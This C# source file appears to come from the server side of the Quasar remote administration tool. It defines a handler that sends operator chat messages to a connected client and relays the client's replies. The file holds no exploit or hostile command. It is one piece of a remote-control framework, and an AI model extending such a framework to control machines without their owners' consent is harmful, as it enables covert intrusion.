using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Server.Networking;
using System;

namespace Quasar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote chat.
    /// </summary>
    public class RemoteChatHandler : MessageProcessorBase<string>, IDisposable
    {
        /// <summary>
        /// The client which is associated with this remote chat handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// Initializes a new instance of the <see cref="RemoteChatHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public RemoteChatHandler(Client client) : base(true)
        {
            _client = client;
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is DoChatResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoChatResponse msg:
                    Execute(sender, msg);
                    break;
            }
        }

        /// <summary>
        /// Sends a chat message to the client.
        /// </summary>
        /// <param name="message">The message text to send.</param>
        /// <param name="senderName">The display name of the sender (server operator).</param>
        public void SendChatMessage(string message, string senderName)
        {
            _client.Send(new DoChat
            {
                Message = message,
                SenderName = senderName
            });
        }

        private void Execute(ISender sender, DoChatResponse message)
        {
            // Report the incoming message text via OnReport so the form can subscribe to ProgressChanged
            string formatted = message.SenderName + "|" + message.Message;
            OnReport(formatted);
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
        }
    }
}
